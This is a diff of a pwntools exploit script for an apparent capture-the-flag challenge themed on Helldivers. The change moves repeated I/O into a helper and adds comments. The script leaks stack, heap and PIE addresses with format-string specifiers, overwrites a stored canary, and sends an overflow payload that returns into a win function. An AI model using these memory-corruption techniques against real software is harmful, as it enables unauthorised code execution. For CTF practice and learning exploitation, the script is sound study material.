@@ -10,12 +10,6 @@ context.update(
         #terminal=["tmux", "split-window", "-h", "-p 65"]
         terminal=["st"]
 )
-to = 2
-
-ru = lambda p,s: p.recvuntil(s, timeout=to)
-rl = lambda p: p.recvline()
-sla = lambda p,a,b: p.sendlineafter(a, b, timeout=to)
-sl = lambda p,a: p.sendline(a)
 
 def start(binary):
 
@@ -38,44 +32,43 @@ def start(binary):
     else:
         return process(binary)
 
+def deploy_strat(p, payload):
+    p.sendline(payload)
+    p.recvuntil(b"Deploying stratagem:")
+    p.recvline()
+    
+
 def exploit(p,e,r):
    
     objective = b"\xe2\xac\x87 \xe2\xac\x86 \xe2\xac\x87 \xe2\xac\x86\x00"
 
-    p.sendline(b"%22$p")
-    p.recvuntil(b"Deploying stratagem:")
-    p.recvline()
+    # Leak stack address
+    deploy_strat(p, b"%22$p")
     stack_addr = int(p.recvline(),16) - 24
     log.info(f"Leaked stack address {hex(stack_addr)}")
-
-
+        
     # Leak saved ret val from heap
-    p.sendline(b"%21$p")
-    p.recvuntil(b"Deploying stratagem:")
-    p.recvline()
+    deploy_strat(p,b"%21$p")
     heap_addr = int(p.recvline(),16)
     log.info(f"Leaked heap address {hex(heap_addr)}")
 
-
     # Get PIE base
-    p.sendline(b"%29$p")
-    p.recvuntil(b"Deploying stratagem:")
-    p.recvline()
+    deploy_strat(p, b"%29$p")
     pie_base = int(p.recvline().strip(),16) - 4700
     log.info(f"Leaked PIE Base {hex(pie_base)}")
 
-   
     win = p64(e.sym["superearthflag"] + pie_base)
-
+        
+    # Overwrite the canary saved on canary list for main+34
     p.recvuntil(b"Waiting on your call, helldiver >>>")
     p.sendline(objective)
-
-    # Overwrite the canary saved for main+34
+        
     xor_value = p64(0x1337)
 
+    # Select first value on the list
     p.recvuntil(b"your Democracy Officer today?")
     p.send(xor_value)
-    
+    # Set first value to win
     p.recvuntil(b"Verify mission credentials:")
     p.send(win)
 
@@ -86,6 +79,7 @@ def exploit(p,e,r):
 
     # Return value for menu to main
     exp = cyclic(120) + p64(heap_addr) + p64(stack_addr+0x30) + ret_val
+    # Return value from main to __libc_start_main
     exp += cyclic(32) + p64(stack_addr+0x108) + p64(0x21) + win + b"B" * 184 + p64(0)  + p64(0x21) + win + cyclic(0x10) + p64(0x21)
     p.recvuntil(b"Waiting on your call, helldiver >>>")
     p.sendline(exp)   
